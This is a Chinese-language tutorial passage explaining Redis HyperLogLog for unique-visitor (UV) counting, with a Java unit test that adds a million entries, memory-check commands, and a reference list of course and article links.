UV统计在服务端做会比较麻烦，因为要判断该用户是否已经统计过了，需要将统计过的用户信息保存。但是如果每个访问的用户都保存到Redis中，数据量会非常恐怖。

Hyperloglog（HLL）是从Loglog算法派生的概率算法，用于确定非常大的集合的基数，而不需要存储其所有值。

Redis中的HLL是基于`String`结构实现的，单个HLL的内存永远小于16KB，内存占用低的令人发指！作为代价，其测量结果是概率性的，有小于0.81％的误差。不过对于UV统计来说，这完全可以忽略。

相关命令如下：

| 命令      | 描述                        |
| --------- | --------------------------- |
| `PFADD`   | 向Hyperloglog添加元素       |
| `PFCOUNT` | 返回集合的近似基数          |
| `PFMERGE` | 将多个不同的Hyperloglog合并 |

### 实现UV统计

我们直接利用单元测试，向HyperLogLog中添加100万条数据，看看内存占用和统计效果如何。

首先查看Redis的内存占用情况（即“used_memory”）：

```sh
info memory
```

测试：

```java
@Test
public void testHyperLogLog() {
    String[] values = new String[1000];
    int j;
    for (int i = 0; i < 1000000; i++) {
        j = i % 1000;
        values[j] = "user_" + i;
        if (j == 999) {
            // 发送到Redis
            stringRedisTemplate.opsForHyperLogLog().add("hl2", values);
        }
    }
    // 统计数量
    Long count = stringRedisTemplate.opsForHyperLogLog().size("hl2");
    System.out.println("count = " + count);
}
```

查看输出结果并再次查看Redis的内存占用情况：

```sh
info memory
```

总结一下，HyperLogLog的作用：

- 做海量数据的统计工作。

HyperLogLog的优点：

- 内存占用极低。
- 性能非常好。

HyperLogLog的缺点：

- 有一定的误差。

# 参考

[^1]: [黑马程序员Redis入门到实战教程，全面透析redis底层原理+redis分布式锁+企业解决方案+redis实战](https://www.bilibili.com/video/BV1cr4y1671t)
[^1]: [7.2022版Redis入门到精通](https://pan.baidu.com/s/1189u6u4icQYHg_9_7ovWmA?pwd=eh11#list/path=%2F)，提取码：eh11
[^2]: [nosql是什么](https://www.php.cn/faq/432824.html)

[^3]: [Redis未授权访问配合SSH key文件利用分析](https://cloud.tencent.com/developer/article/1039000)
